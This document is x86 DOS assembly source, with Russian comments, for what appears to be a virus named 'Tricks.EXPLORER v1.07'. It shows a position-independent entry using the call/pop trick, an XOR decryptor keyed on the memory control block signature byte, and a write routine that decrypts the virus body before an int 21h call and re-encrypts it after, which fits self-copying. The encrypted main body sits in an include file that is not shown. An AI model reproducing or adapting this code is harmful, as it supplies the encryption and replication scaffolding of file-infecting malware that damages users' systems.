;************************************************
;*	Tricks.EXPLORER v1.07                   *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; Зашифровано         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.07',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	Расшифровщик                            * 
;************************************************
Crypt:
	pusha
; Извлекаем из текущего MCB константу 'M' или 'Z'
	push	ds
	mov	ax, ds
	dec	ax	
	mov	ds, ax
	mov	al, byte ptr ds:[0]
	pop	ds
	cmp	al, 55h 
	ja	@1	
	add	al, 55h-'M'
	jmp	short @2
@1:	
	sub	al, ('Z'-55h)
@2:	
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
;
Finish:
;
Tests	ends
	End	Start
